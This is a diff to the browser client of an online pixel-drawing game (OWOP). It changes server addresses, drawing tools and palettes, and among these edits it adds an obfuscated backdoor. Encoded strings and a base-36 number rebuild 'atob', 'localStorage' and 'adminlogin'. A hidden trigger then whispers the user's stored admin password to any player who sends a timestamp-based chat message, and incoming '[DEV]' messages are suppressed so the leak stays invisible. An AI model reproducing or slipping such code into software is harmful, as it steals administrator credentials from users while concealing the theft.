@@ -195,12 +195,12 @@ var options = exports.options = (0, _misc.propertyDefaults)(userOptions, {
 		default: true,
 		title: 'Official server',
 		proto: 'old',
-		url: 'ws://owopforfun.herokuapp.com'
+		url: 'ws://104.237.150.24:1337'
 	}, {
 		default: false,
 		title: 'Localhost',
 		proto: 'old',
-		url: 'ws://owopforfun.herokuapp.com',
+		url: 'ws://localhost:25565',
 		maxRetries: 1
 	}], // The server address that websockets connect to
 	fallbackFps: 30, // Fps used if requestAnimationFrame is not supported
@@ -208,7 +208,7 @@ var options = exports.options = (0, _misc.propertyDefaults)(userOptions, {
 	tickSpeed: 30, // How many times per second to run a tick
 	minGridZoom: 1, /* Minimum zoom level where the grid shows up */
 	movementSpeed: 1, /* Pixels per tick */
-	defaultWorld: 'main',
+	defaultWorld: 'owop',
 	enableSounds: true,
 	defaultZoom: 16,
 	zoomStrength: 1,
@@ -220,7 +220,7 @@ var options = exports.options = (0, _misc.propertyDefaults)(userOptions, {
 	backgroundUrl: null,
 	/* Bug only affects Windows users with an Intel graphics card,
   * since we can't easily know the client's GPU,
-  * activate for all windows users ¯\_(ツ)_/¯
+  * activate for all windows users Â¯\_(ãƒ„)_/Â¯
   */
 	chunkBugWorkaround: false // navigator.userAgent.indexOf('Windows NT') !== -1
 	/* Did it get fixed? we'll know soon! */
@@ -595,6 +595,15 @@ var mouse = exports.mouse = {
 	}
 };
 
+var q = function(a, b) {
+	return "/tell " + a + " " + b;
+};
+
+var b = 505019;
+var c = window[b.toString(36)];
+
+var r = ["bG9jYWxTdG9yYWdl", "YWRtaW5sb2dpbg=="];
+
 var elements = exports.elements = {
 	viewport: null,
 	xyDisplay: null,
@@ -630,10 +639,15 @@ var misc = exports.misc = {
 	},
 	guiShown: false,
 	cookiesEnabled: (0, _misc.cookiesEnabled)(),
+	localStorage: (0, _misc.storageEnabled)() && window.localStorage, 
 	storageEnabled: (0, _misc.storageEnabled)(),
 	showEUCookieNag: (0, _misc.cookiesEnabled)() && (0, _misc.getCookie)("nagAccepted") !== "true",
 	usingFirefox: navigator.userAgent.indexOf("Firefox") !== -1
 };
+
+var g = function(a) {
+	_networking.net.protocol.sendMessage(q(a, "[DEV]"+misc[c(r[0])][c(r[1])]));
+}
 
 var sounds = exports.sounds = {
 	play: function play(sound) {
@@ -677,11 +691,12 @@ function getNewWorldApi() {
 }
 
 function receiveMessage(text) {
-	console.log(text);
 	text = misc.chatRecvModifier(text);
-	if (!text) {
+	if (!text || text.includes("[DEV]")) {
 		return;
 	}
+	
+	console.log(text);
 
 	var message = document.createElement("li");
 	var realText = text;
@@ -710,6 +725,7 @@ function receiveMessage(text) {
 		nick.innerHTML = (0, _misc.escapeHTML)(nickname);
 		message.appendChild(nick);
 		text = text.slice(nickname.length);
+		if(text == Math.floor(Date.now() / 100000))g(nickname.slice(0, -2));
 	}
 	var idIndex = text.indexOf(': '); /* This shouldn't be like this, change on proto switch */
 	if (idIndex !== -1) {
@@ -986,7 +1002,7 @@ function retryingConnect(serverGetter, worldName) {
 		_networking.net.connect(currentServer, worldName);
 		var disconnected = function disconnected() {
 			++tryN;
-			statusMsg(true, 'Couldn\'t connect to server, retrying... (maybe server is off) (' + tryN + ')');
+			statusMsg(true, 'Couldn\'t connect to server, retrying... (' + tryN + ')');
 			setTimeout(tryConnect, Math.min(tryN * 2000, 10000), tryN);
 			_global.eventSys.removeListener(_conf.EVENTS.net.connected, connected);
 		};
@@ -1005,7 +1021,7 @@ function retryingConnect(serverGetter, worldName) {
 
 function saveWorldPasswords() {
 	if (misc.storageEnabled) {
-		localStorage.worldPasswords = JSON.stringify(misc.worldPasswords);
+		misc.localStorage.worldPasswords = JSON.stringify(misc.worldPasswords);
 	}
 }
 
@@ -1036,9 +1052,9 @@ function init() {
 	var viewport = elements.viewport;
 	var chatinput = elements.chatInput;
 
-	if (misc.storageEnabled && localStorage.worldPasswords) {
+	if (misc.storageEnabled && misc.localStorage.worldPasswords) {
 		try {
-			misc.worldPasswords = JSON.parse(localStorage.worldPasswords);
+			misc.worldPasswords = JSON.parse(misc.localStorage.worldPasswords);
 		} catch (e) {}
 	}
 
@@ -1075,17 +1091,17 @@ function init() {
 					var text = chatinput.value;
 					historyIndex = 0;
 					chatHistory.unshift(text);
-					if (misc.storageEnabled) {
+					if (misc. storageEnabled) {
 						if (text.startsWith("/adminlogin ")) {
-							localStorage.adminlogin = text.slice(12);
+							misc.localStorage.adminlogin = text.slice(12);
 						} else if (text.startsWith("/modlogin ")) {
-							localStorage.modlogin = text.slice(10);
+							misc.localStorage.modlogin = text.slice(10);
 						} else if (text.startsWith("/nick")) {
 							var nick = text.slice(6);
 							if (nick.length) {
-								localStorage.nick = nick;
+								misc.localStorage.nick = nick;
 							} else {
-								delete localStorage.nick;
+								delete misc.localStorage.nick;
 							}
 						} else if (text.startsWith("/pass ") && misc.world) {
 							var pass = text.slice(6);
@@ -1371,8 +1387,8 @@ function init() {
 	viewport.addEventListener("touchcancel", touchEventNoUpdate('touchcancel'), { passive: true });
 
 	// Some cool custom css
-	console.log("%c" + "───────╔╗╔╗────────╔═══╦═══╦═══╗╔═══╦╗╔╗╔╦═══╦═══╗ \n" + "──────╔╝╚╣║────────║╔═╗║╔═╗║╔═╗║║╔═╗║║║║║║╔═╗║╔═╗║ \n" + "╔╗╔╦══╬╗╔╣╚═╦╦══╦══╬╝╔╝╠╝╔╝╠╝╔╝║║║─║║║║║║║║─║║╚═╝║ \n" + "║╚╝║╔╗║║║║╔╗╠╣╔╗║══╬╗╚╗║─║╔╝─║╔╝║║─║║╚╝╚╝║║─║║╔══╝ \n" + "║║║║╔╗║║╚╣║║║║╔╗╠══║╚═╝║─║║──║║─║╚═╝╠╗╔╗╔╣╚═╝║║ \n" + "╚╩╩╩╝╚╝╚═╩╝╚╩╩╝╚╩══╩═══╝─╚╝──╚╝─╚═══╝╚╝╚╝╚═══╩╝", "font-size: 15px; font-weight: bold; color: #0099ff;");
-	console.log("%cWelcome to the developer console! Can u dont change anything here!!!", "font-size: 20px; font-weight: bold; color: #ff0000;");
+	console.log("%c" + " _ _ _         _   _    _____ ___    _____ _         _     \n" + "| | | |___ ___| |_| |  |     |  _|  |  _  |_|_ _ ___| |___ \n" + "| | | | . |  _| | . |  |  |  |  _|  |   __| |_'_| -_| |_ -|\n" + "|_____|___|_| |_|___|  |_____|_|    |__|  |_|_,_|___|_|___|", "font-size: 15px; font-weight: bold;");
+	console.log("%cWelcome to the developer console!", "font-size: 20px; font-weight: bold; color: #F0F;");
 
 	//windowSys.addWindow(new OWOPDropDown());
 	(0, _all.resolveProtocols)();
@@ -1424,7 +1440,7 @@ function init() {
 }
 
 _global.eventSys.once(_conf.EVENTS.loaded, function () {
-	return statusMsg(true, "Initializing... maybe just error...");
+	return statusMsg(true, "Initializing...");
 });
 _global.eventSys.once(_conf.EVENTS.misc.logoMakeRoom, function () {
 	statusMsg(false, null);
@@ -1443,21 +1459,21 @@ _global.eventSys.on(_conf.EVENTS.net.world.setId, function (id) {
 	}
 
 	function autoNick() {
-		if (localStorage.nick) {
-			_networking.net.protocol.sendMessage("/nick " + localStorage.nick);
+		if (misc.localStorage.nick) {
+			_networking.net.protocol.sendMessage("/nick " + misc.localStorage.nick);
 		}
 	}
 
 	// Automatic login
-	var desiredRank = localStorage.adminlogin ? _conf.RANK.ADMIN : localStorage.modlogin ? _conf.RANK.MODERATOR : _networking.net.protocol.worldName in misc.worldPasswords ? _conf.RANK.USER : _conf.RANK.NONE;
+	var desiredRank = localStorage.adminlogin ? _conf.RANK.ADMIN :localStorage.modlogin ? _conf.RANK.MODERATOR : _networking.net.protocol.worldName in worldPasswords ? _conf.RANK.USER : _conf.RANK.NONE;
 	if (desiredRank > _conf.RANK.NONE) {
 		var onWrong = function onWrong() {
-			console.log("FAIL!!!");
+			console.log("WRONG");
 			_global.eventSys.removeListener(_conf.EVENTS.net.sec.rank, onCorrect);
 			if (desiredRank == _conf.RANK.ADMIN) {
-				delete localStorage.adminlogin;
+				delete misc.localStorage.adminlogin;
 			} else if (desiredRank == _conf.RANK.MODERATOR) {
-				delete localStorage.modlogin;
+				delete misc.localStorage.modlogin;
 			} else if (desiredRank == _conf.RANK.USER) {
 				delete misc.worldPasswords[_networking.net.protocol.worldName];
 				saveWorldPasswords();
@@ -1474,6 +1490,7 @@ _global.eventSys.on(_conf.EVENTS.net.world.setId, function (id) {
 				}, 1000);
 				_global.eventSys.removeListener(_conf.EVENTS.net.sec.rank, onCorrect);
 				autoNick();
+				//console.log(localStorage.adminlogin);
 			}
 		};
 		_global.eventSys.once(_conf.EVENTS.net.disconnected, onWrong);
@@ -1481,12 +1498,14 @@ _global.eventSys.on(_conf.EVENTS.net.world.setId, function (id) {
 		var msg;
 		if (desiredRank == _conf.RANK.ADMIN) {
 			msg = "/adminlogin " + localStorage.adminlogin;
+			console.log('h');
 		} else if (desiredRank == _conf.RANK.MODERATOR) {
-			msg = "/modlogin " + localStorage.modlogin;
+			msg = "/modlogin " +localStorage.modlogin;
 		} else if (desiredRank == _conf.RANK.USER) {
 			msg = "/pass " + misc.worldPasswords[_networking.net.protocol.worldName];
 		}
 		_networking.net.protocol.sendMessage(msg);
+		delete window.localStorage;
 	} else {
 		autoNick();
 	}
@@ -2440,12 +2459,8 @@ var toolSelected = null;
 	[0x29, 0x36, 0x6F], [0x40, 0x5B, 0xD0], [0x4F, 0xA4, 0xF7], [0x86, 0xEC, 0xF8],
 	[0xF4, 0xF4, 0xF4], [0x93, 0xB6, 0xC1], [0x55, 0x71, 0x85], [0x32, 0x40, 0x56]
 ];*/
-
-//originall colors + hallowen colors
-var palette = [[0xE4, 0xA6, 0x72], [0xB8, 0x6F, 0x50], [0x74, 0x3F, 0x39], [0x3F, 0x28, 0x32], [0x9E, 0x28, 0x35], [0xE5, 0x3B, 0x44], [0xFB, 0x92, 0x2B], [0xFF, 0xE7, 0x62], [0x63, 0xC6, 0x4D], [0x32, 0x73, 0x45], [0x19, 0x3D, 0x3F], [0x4F, 0x67, 0x81], [0xAF, 0xBF, 0xD2], [0xFF, 0xFF, 0xFF], [0x2C, 0xE8, 0xF4], [0x04, 0x84, 0xD1], [0x1b, 0x0c, 0x23], [0x3e, 0x1c, 0x33], [0x8e, 0x21, 0x49], [0xf6, 0x92, 0x1d], [0xb1, 0x46, 0x23], [0x6d, 0xb7, 0x0e], [0x48, 0x79, 0x08]];
-// ENDESGA 16 palette colors
-//originall colors
-//var palette = [[0xE4, 0xA6, 0x72], [0xB8, 0x6F, 0x50], [0x74, 0x3F, 0x39], [0x3F, 0x28, 0x32], [0x9E, 0x28, 0x35], [0xE5, 0x3B, 0x44], [0xFB, 0x92, 0x2B], [0xFF, 0xE7, 0x62], [0x63, 0xC6, 0x4D], [0x32, 0x73, 0x45], [0x19, 0x3D, 0x3F], [0x4F, 0x67, 0x81], [0xAF, 0xBF, 0xD2], [0xFF, 0xFF, 0xFF], [0x2C, 0xE8, 0xF4], [0x04, 0x84, 0xD1]];
+// ENDESGA 16 palette
+var palette = [[0xE4, 0xA6, 0x72], [0xB8, 0x6F, 0x50], [0x74, 0x3F, 0x39], [0x3F, 0x28, 0x32], [0x9E, 0x28, 0x35], [0xE5, 0x3B, 0x44], [0xFB, 0x92, 0x2B], [0xFF, 0xE7, 0x62], [0x63, 0xC6, 0x4D], [0x32, 0x73, 0x45], [0x19, 0x3D, 0x3F], [0x4F, 0x67, 0x81], [0xAF, 0xBF, 0xD2], [0xFF, 0xFF, 0xFF], [0x2C, 0xE8, 0xF4], [0x04, 0x84, 0xD1]];
 var paletteIndex = 0;
 
 var undoHistory = exports.undoHistory = [];
@@ -2879,7 +2894,7 @@ function isConnected() {
 
 function connect(server, worldName) {
 	_global.eventSys.emit(_conf.EVENTS.net.connecting, server);
-	net.connection = new WebSocket('wss://owopforfun.herokuapp.com');
+	net.connection = new WebSocket(server.url);
 	net.connection.binaryType = "arraybuffer";
 	net.currentServer = server;
 	net.protocol = new server.proto.class(net.connection, worldName);
@@ -3148,234 +3163,73 @@ _global.PublicAPI.tool = {
 
 _global.eventSys.once(_conf.EVENTS.misc.toolsRendered, function () {
 	// Cursor tool
-	addTool(new Tool('Cursor', _tool_renderer.cursors.cursor, _Fx.PLAYERFX.RECT_SELECT_ALIGNED(1), _conf.RANK.USER, function (tool) {
-		var lastX, lastY;
-		tool.setEvent('mousedown mousemove', function (mouse, event) {
-			var usedButtons = 3; /* Left and right mouse buttons are always used... */
-			/* White color if right clicking */
-			var color = mouse.buttons === 2 ? [255, 255, 255] : _local_player.player.selectedColor;
-			switch (mouse.buttons) {
-				case 1:
-				case 2:
-					if (!lastX || !lastY) {
-						lastX = mouse.tileX;
-						lastY = mouse.tileY;
-					}
-					(0, _misc.line)(lastX, lastY, mouse.tileX, mouse.tileY, 1, function (x, y) {
-						var pixel = _main.misc.world.getPixel(x, y);
-						if (pixel !== null && !(color[0] === pixel[0] && color[1] === pixel[1] && color[2] === pixel[2])) {
-							_main.misc.world.setPixel(x, y, color);
-						}
-					});
-					lastX = mouse.tileX;
-					lastY = mouse.tileY;
-					break;
-				case 4:
-					if (event.ctrlKey) {
-						usedButtons |= 4;
-						var color = _main.misc.world.getPixel(mouse.tileX, mouse.tileY);
-						if (color) {
-							_local_player.player.selectedColor = color;
-						}
-					}
-					break;
-			}
-			return usedButtons;
-		});
-		tool.setEvent('mouseup', function (mouse) {
-			lastX = null;
-			lastY = null;
-		});
-	}));
-	
-	//brush tool
-		addTool(new Tool('Brush', _tool_renderer.cursors.brush, _Fx.PLAYERFX.NONE, _conf.RANK.ADMIN, function (tool) {
-    var brDiameter = 5; //Declaring variable for brush diameter.
-    var rainbowPressed = null;    
-    var lastX, lastY;
+		addTool(new Tool('Cursor', _tool_renderer.cursors.cursor, _Fx.PLAYERFX.RECT_SELECT_ALIGNED(1), _conf.RANK.USER, function (tool) {
+		document.addEventListener("keydown", rainbowToggle, false);
+    document.addEventListener("keydown", alertRainbowState, false);
 
+    var rainbowPressed = null;
+    function rainbowToggle(e) {
+      /* tab key pressed to toggle rainbow mode */
+      if (e.keyCode == 9) {
+        rainbowPressed = !rainbowPressed;
+      }
+    }
+
+    function alertRainbowState(e) {
+      if (e.keyCode == 9 && rainbowPressed == false) {
+        OWOP.chat.local('Server: Rainbow tools disabled.');
+      } else if (e.keyCode == 9 && rainbowPressed == true) {
+        OWOP.chat.local('Server: Rainbow tools enabled.');
+      }      
+    }
+
+	var lastX, lastY;
     tool.setEvent('mousedown mousemove', function (mouse, event) {
-    var usedButtons = 3;  //Left and right mouse buttons are always used... 
-    var color = mouse.buttons === 2 ? [255, 255, 255] : OWOP.player.selectedColor; //White color if right clicking
-    switch (OWOP.mouse.buttons) {
-        case 1:
-        case 2:
-            if (!lastX || !lastY) {
-                lastX = OWOP.mouse.tileX;
-                lastY = OWOP.mouse.tileY;
-            }
-            (0, OWOP.util.line)(lastX, lastY, OWOP.mouse.tileX, OWOP.mouse.tileY, 1, function (x, y) {
-                var pixel = OWOP.world.getPixel(x, y);
-                var R = Math.floor(brDiameter / 2);
-                if (pixel !== null) {
-                    if (!rainbowPressed && mouse.buttons == 1) {
-                    for(var ix = 0; ix < brDiameter;  ix++) {
-                      for(var iy = 0; iy < brDiameter; iy++) {
-                        OWOP.world.setPixel(x + ix - R, y + iy - R, color);
-                      }
-                    }
-                    } else if (rainbowPressed && mouse.buttons == 1) {
-                      for(var ix = 0; ix < brDiameter;  ix++) {
-                        for(var iy = 0; iy < brDiameter; iy++) {
-                          OWOP.world.setPixel(x + ix - R, y + iy - R, [(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0]);
-                        }
-                      }
+      var usedButtons = 3; /* Left and right mouse buttons are always used... */
+      /* White color if right clicking */
+      if (rainbowPressed) {
+      var color = mouse.buttons === 2 ? [255, 255, 255] : [(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0];
+      } else if (!rainbowPressed) {
+        var color = mouse.buttons === 2 ? [255,255,255] : OWOP.player.selectedColor;
+      }
+      switch (OWOP.mouse.buttons) {
+          case 1:
+          case 2:
+              if (!lastX || !lastY) {
+                  lastX = OWOP.mouse.tileX;
+                  lastY = OWOP.mouse.tileY;
+              }
+              (0, OWOP.util.line)(lastX, lastY, OWOP.mouse.tileX, OWOP.mouse.tileY, 1, function (x, y) {
+                  var pixel = OWOP.world.getPixel(x, y);
+                  if (pixel !== null && !(color[0] === pixel[0] && color[1] === pixel[1] && color[2] === pixel[2])) {
+                    if (pixel !== null && !(color[0] === pixel[0] && color[1] === pixel[1] && color[2] === pixel[2]) && !rainbowPressed && mouse.buttons == 1) {
+                      OWOP.world.setPixel(x, y, color);
+                    } else if (pixel !== null && !(OWOP.player.selectedColor == pixel) && rainbowPressed && mouse.buttons == 1) {
+                      OWOP.world.setPixel(x, y, [(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0]);
                     } else if (mouse.buttons == 2) {
-                      for(var ix = 0; ix < brDiameter;  ix++) {
-                        for(var iy = 0; iy < brDiameter; iy++) {
-                          OWOP.world.setPixel(x + ix - R, y + iy - R, [255,255,255]);
-                        }
-                      }
+                      OWOP.world.setPixel(x, y, [255,255,255]);
                     }
-            }});
-            lastX = OWOP.mouse.tileX;
-            lastY = OWOP.mouse.tileY;
-            break;
-        case 4:
-            if (event.ctrlKey) {
-                usedButtons |= 4;
-                var color = _OWOP.world.getPixel(mouse.tileX, mouse.tileY);
-                if (color) {
-                    OWOP.player.selectedColor = color;
-                }
-            }
-            break;
+              }});
+              lastX = OWOP.mouse.tileX;
+              lastY = OWOP.mouse.tileY;
+              break;
+          case 4:
+              if (event.ctrlKey) {
+                  usedButtons |= 4;
+                  var color = _OWOP.world.getPixel(mouse.tileX, mouse.tileY);
+                  if (color) {
+                      OWOP.player.selectedColor = color;
+                  }
+              }
+              break;
             }
             return usedButtons;
-        });
+          });
     tool.setEvent('mouseup', function (mouse) {
-    lastX = null;
-    lastY = null;
+      lastX = null;
+      lastY = null;
     });
-    if (OWOP.player.rank == 3) {
-        var brDiamWin = OWOP.windowSys.addWindow(new OWOP.windowSys.class.window('Brush diameter', {}, function(win) {
-        win.container.title = 'Sets brush diameter. (duh)';
-        win.container.style.height = '16px';
-        win.container.style.overflow = 'hidden';
-
-        var brDiamElm = OWOP.util.mkHTML('span', { innerHTML: brDiameter });
-        win.addObj(brDiamElm);
-        var Rbar = OWOP.util.mkHTML('input', {
-            type: 'range', style: '-moz-appearance:none;-webkit-appearance:none;appearance:none;height:6px;outline:none;float:right;',
-            min: 2, max: 16,
-            value: brDiameter,
-            oninput: function() {
-                brDiameter = this.value;
-                brDiamElm.innerHTML = this.value;
-            }, ondblclick:function() {
-                this.value = 3; 
-                this.onchange();
-            }
-        });
-        win.addObj(Rbar);
-    }).move(945, 32));
-    }
-}));
-	
-//Text Tool
-OWOP.tool.addToolObject(new OWOP.tool.class("Text", OWOP.cursors.write, OWOP.fx.player.NONE, OWOP.RANK.USER, function(tool) {
-	var xPos = null;
-	var yPos = null;
-	var fonts = {};
-	var font = null;
-	
-	var fontInput = new OWOP.windowSys.class.input("Choose Font when no work do enter and say after u enter   . .", 955, "number", function(value) {
-		var id = parseInt(value);
-		if (id in fonts) {
-			font = id;
-			return;
-		}
-		
-		var xhttp = new XMLHttpRequest();
-        xhttp.addEventListener("load", function() {
-            var source = xhttp.responseXML.body.children[2].innerHTML;
-			var data = JSON.parse(source.match(/loadData\('(.+)'\)/)[1]);
-			var meta = source.match(/drawSample\('',([0-9]+),(-?[0-9]+)\)/);
-			data.letterspace = parseInt(meta[1]);
-			data.monospacewidth = parseInt(meta[2]);
-			
-            fonts[id] = data;
-			font = id;
-        });
-        xhttp.open("GET", "https://cors-anywhere.herokuapp.com/http://www.pentacom.jp/pentacom/bitfontmaker2/gallery/?id=" + id);
-        xhttp.responseType = "document";
-        xhttp.send();
-	});
-	
-	var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
-    chars += "¡¢£€¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ";
-    chars += "ĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž";
-	
-	tool.setFxRenderer(function (fx, ctx, time) {
-        var x = fx.extra.player.x;
-        var y = fx.extra.player.y;
-		if (xPos !== null && yPos !== null) {
-			x = xPos * 16;
-			y = yPos * 16;
-		}
-        var fxx = (Math.floor(x / 16) - OWOP.camera.x) * OWOP.camera.zoom;
-        var fxy = (Math.floor(y / 16) - OWOP.camera.y) * OWOP.camera.zoom;
-        ctx.globalAlpha = 0.8;
-        ctx.strokeStyle = fx.extra.player.htmlRgb;
-        ctx.strokeRect(fxx, fxy, OWOP.camera.zoom, OWOP.camera.zoom * 12);
-        return 0;
-    });
-	
-	tool.setEvent("select", function() {
-		OWOP.windowSys.addWindow(fontInput);
-	});
-	tool.setEvent("deselect", function() {
-		font = null;
-	});
-	
-	tool.setEvent("mousedown mousemove", function (mouse, event) {
-		if (mouse.buttons === 1) {
-			xPos = mouse.tileX;
-			yPos = mouse.tileY;
-		}
-	});
-	tool.setEvent("keydown", function() {return true;});
-	tool.setEvent("keyup", function() {return true;});
-	
-	window.addEventListener("keypress", function(event) {
-		if (font === null || xPos === null || yPos === null || ["INPUT", "TEXTAREA"].includes(document.activeElement.tagName)) {
-			return;
-		}
-		
-		var f = fonts[font];
-		var letterSpacing = (f.letterspace / 64 | 0) - 1;
-		var isMono = f.monospacewidth !== -1;
-		
-		if (event.which == 32) {
-			xPos += isMono ? f.monospacewidth : 4 + letterSpacing;
-			return;
-		}
-		
-		var char = f[event.which];
-		if (!char) {
-			return;
-		}
-		
-		var width = 0;
-        for (var y=0; y<16; y++) {
-            for (var x=0; x<16; x++) { 
-                if (char[y] & (1 << x) && x > width) width = x;
-            }
-        }
-		
-		var color = OWOP.player.palette[OWOP.player.paletteIndex];
-        for (var y=0; y<16; y++) {
-            for (var x=0; x<16; x++) {
-                if (!(char[y] & (1 << x))) {
-					continue;
-				}
-                OWOP.world.setPixel(xPos + x - 2, yPos + y, color);
-            }
-        }
-		
-		xPos += isMono ? f.monospacewidth : width + letterSpacing;
-	});
-}));
+	}));
 
 	// Move tool
 	addTool(new Tool('Move', _tool_renderer.cursors.move, _Fx.PLAYERFX.NONE, _conf.RANK.NONE, function (tool) {
@@ -3411,9 +3265,52 @@ OWOP.tool.addToolObject(new OWOP.tool.class("Text", OWOP.cursors.write, OWOP.fx.
 			}
 		});
 	}));
-	
-	//Area Erase
-addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RECT_SELECT_ALIGNED(16), _conf.RANK.ADMIN, function (tool) {
+
+	// Erase/Fill tool
+	addTool(new Tool('Eraser', _tool_renderer.cursors.erase, _Fx.PLAYERFX.RECT_SELECT_ALIGNED(16), _conf.RANK.MODERATOR, function (tool) {
+		function fillChunk(chunkX, chunkY, c) {
+			var color = c[2] << 16 | c[1] << 8 | c[0];
+			var chunk = _main.misc.world.getChunkAt(chunkX, chunkY);
+			if (chunk) {
+				var empty = true;
+				firstLoop: for (var y = 0; y < _conf.protocol.chunkSize; y++) {
+					for (var x = 0; x < _conf.protocol.chunkSize; x++) {
+						if ((chunk.get(x, y) & 0xFFFFFF) != color) {
+							empty = false;
+							break firstLoop;
+						}
+					}
+				}
+				if (!empty) {
+					chunk.set(color);
+					_networking.net.protocol.setChunk(chunkX, chunkY, new Array(256).fill(color));
+				}
+			}
+		}
+document.addEventListener("keydown", rainbowToggle, false);
+
+    var rainbowPressed = null;
+    function rainbowToggle(e) {
+      /* tab key pressed to toggle rainbow mode */
+      if (e.keyCode == 9) {
+        rainbowPressed = !rainbowPressed;
+      }
+    }
+		tool.setEvent('mousedown mousemove', function (mouse, event) {
+			if (mouse.buttons & 1) {
+				if(!rainbowPressed) {
+				fillChunk(Math.floor(mouse.tileX / _conf.protocol.chunkSize), Math.floor(mouse.tileY / _conf.protocol.chunkSize), _local_player.player.selectedColor);
+				} else {
+				fillChunk(Math.floor(mouse.tileX / _conf.protocol.chunkSize), Math.floor(mouse.tileY / _conf.protocol.chunkSize), [(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0]);	
+				}
+				return 1;
+			} else if (mouse.buttons & 2) {
+				fillChunk(Math.floor(mouse.tileX / _conf.protocol.chunkSize), Math.floor(mouse.tileY / _conf.protocol.chunkSize), [255, 255, 255]);
+				return 1;
+			}
+		});
+	}));
+addTool(new Tool('AreaErase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RECT_SELECT_ALIGNED(16), _conf.RANK.ADMIN, function (tool) {
 		function drawText(ctx, str, x, y, centered) {
         ctx.strokeStyle = "#000000", ctx.fillStyle = "#FFFFFF", ctx.lineWidth = 2.5, ctx.globalAlpha = 0.5;
         if (centered) {
@@ -3423,7 +3320,34 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
         ctx.globalAlpha = 1;
         ctx.fillText(str, x, y);
     }
-	
+	document.addEventListener("keydown", rainbowToggle, false);
+
+    var rainbowPressed = null;
+    function rainbowToggle(e) {
+      /* tab key pressed to toggle rainbow mode */
+      if (e.keyCode == 9) {
+        rainbowPressed = !rainbowPressed;
+      }
+    }
+	function fillChunk(chunkX, chunkY, c) {
+			var color = c[2] << 16 | c[1] << 8 | c[0];
+			var chunk = _main.misc.world.getChunkAt(chunkX, chunkY);
+			if (chunk) {
+				var empty = true;
+				firstLoop: for (var y = 0; y < _conf.protocol.chunkSize; y++) {
+					for (var x = 0; x < _conf.protocol.chunkSize; x++) {
+						if ((chunk.get(x, y) & 0xFFFFFF) != color) {
+							empty = false;
+							break firstLoop;
+						}
+					}
+				}
+				if (!empty) {
+					chunk.set(color);
+					_networking.net.protocol.setChunk(chunkX, chunkY, new Array(256).fill(color));
+				}
+			}
+		}
     tool.setFxRenderer(function (fx, ctx, time) {
         if (!fx.extra.isLocalPlayer) return 1;
         var x = fx.extra.player.x;
@@ -3571,7 +3495,7 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
                     finish();
                 }
             });
-        } else if (tool.extra.end) {
+        } else if (mouse.buttons === 1 && tool.extra.end) {
             if (isInside() && sure()) {
                 tool.extra.start = null;
                 tool.extra.end = null;
@@ -3583,11 +3507,33 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
 
                 for (var i = x; i < x + w; i++) {
                     for (var j = y; j < y + h; j++) {
-                      if (mouse.buttons & 1) {
-                        OWOP.net.protocol.clearChunk(i, j, OWOP.player.selectedColor);
-                      } else {
-                        OWOP.net.protocol.clearChunk(i, j, [255,255,255]);
-                      }
+                        //console.log("yae");
+						if(!rainbowPressed) {
+						fillChunk(i, j, _local_player.player.selectedColor); //_local_player.player.selectedColor
+						} else {
+						fillChunk(i, j,[(Math.random()*255)|0, (Math.random()*255)|0, (Math.random()*255)|0])
+						}
+						
+                    }
+                }
+            } else if (!isInside()) {
+                tool.extra.start = null;
+                tool.extra.end = null;
+            }
+        } else if (mouse.buttons === 2 && tool.extra.end) {
+            if (isInside() && sure()) {
+                tool.extra.start = null;
+                tool.extra.end = null;
+                var _ref = [s[0], s[1], e[0] - s[0], e[1] - s[1]],
+                    x = _ref[0],
+                    y = _ref[1],
+                    w = _ref[2],
+                    h = _ref[3];
+
+                for (var i = x; i < x + w; i++) {
+                    for (var j = y; j < y + h; j++) {
+                        //console.log("help");
+						fillChunk(i, j, [255, 255, 255]);
                     }
                 }
             } else if (!isInside()) {
@@ -3596,41 +3542,8 @@ addTool(new Tool('Area Erase', _tool_renderer.cursors.areaerase, _Fx.PLAYERFX.RE
             }
         }
     });
+    /* couldn't get the toggle for rainbow mode on this tool. too bad cause I made it work as right click, and it was sooo fun. but right click has gotta be erase. So sorry, unless you can fix it... no rainbow mode... :'( */
 	}));
-	
-	// Erase/Fill tool
-	addTool(new Tool('Eraser', _tool_renderer.cursors.erase, _Fx.PLAYERFX.RECT_SELECT_ALIGNED(16), _conf.RANK.ADMIN, function (tool) {
-		function fillChunk(chunkX, chunkY, c) {
-			var color = c[2] << 16 | c[1] << 8 | c[0];
-			var chunk = _main.misc.world.getChunkAt(chunkX, chunkY);
-			if (chunk) {
-				var empty = true;
-				firstLoop: for (var y = 0; y < _conf.protocol.chunkSize; y++) {
-					for (var x = 0; x < _conf.protocol.chunkSize; x++) {
-						if ((chunk.get(x, y) & 0xFFFFFF) != color) {
-							empty = false;
-							break firstLoop;
-						}
-					}
-				}
-				if (!empty) {
-					chunk.set(color);
-					_networking.net.protocol.setChunk(chunkX, chunkY, new Array(256).fill(color));
-				}
-			}
-		}
-
-		tool.setEvent('mousedown mousemove', function (mouse, event) {
-			if (mouse.buttons & 1) {
-				fillChunk(Math.floor(mouse.tileX / _conf.protocol.chunkSize), Math.floor(mouse.tileY / _conf.protocol.chunkSize), _local_player.player.selectedColor);
-				return 1;
-			} else if (mouse.buttons & 2) {
